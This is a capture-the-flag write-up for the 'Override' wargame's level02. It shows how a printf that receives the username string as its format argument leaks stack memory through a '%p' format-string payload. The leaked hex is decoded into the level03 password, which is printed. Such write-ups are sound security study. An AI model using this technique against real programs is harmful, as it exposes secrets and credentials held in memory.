# Override - level02

We've started executing the binary to see what was asking.

It asked a username and a password. If the input was wrong it printed "<username> does not have access!".

Probably a printf was involved.

We verified using gdb and effectively printf was present and we noticed that the one used to print the username is vulnerable since the username string is printed directly.

```
Dump of assembler code for function main:
...
0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]           <- address of username string
0x0000000000400a9a <+646>:	mov    rdi,rax                  <- username string is pushed as first parameter
                                                               of printf
0x0000000000400a9d <+649>:	mov    eax,0x0
0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>    <- unprotected printf
0x0000000000400aa7 <+659>:	mov    edi,0x400d3a
0x0000000000400aac <+664>:	call   0x400680 <puts@plt>
0x0000000000400ab1 <+669>:	mov    edi,0x1
0x0000000000400ab6 <+674>:	call   0x400710 <exit@plt>
```

Since we have a vulnerable printf we can try a format string attack.

We test using

```
python -c "print '%p ' * 100" | ./level02
```

we can see that since the printf isn't protected some addresses from the stack are printed.

Since the program opened the .pass file from level03 that was pushed to the stack, we only needed to find some addresses convertible in ascii.

```
[...]
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
[...]
```
```
756e505234376848 = unPR47hH (ascii)
45414a3561733951 = EAJ5as9Q (ascii)
377a7143574e6758 = 7zqCWNgX (ascii)
354a35686e475873 = 5J5hnGXs (ascii)
48336750664b394d = H3gPfK9M (ascii)
```

After we reverse them since

```
unPR47hH (ascii) <=> Hh74RPnu (reversed)
EAJ5as9Q (ascii) <=> Q9sa5JAE (reversed)
7zqCWNgX (ascii) <=> XgNWCqz7 (reversed)
5J5hnGXs (ascii) <=> sXGnh5J5 (reversed)
H3gPfK9M (ascii) <=> M9KfPg3H (reversed)
```

Adding them up we have the password to get to the level03 shell that is also the flag.

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: 
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, !

$ whoami
level03

$ cat ~level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
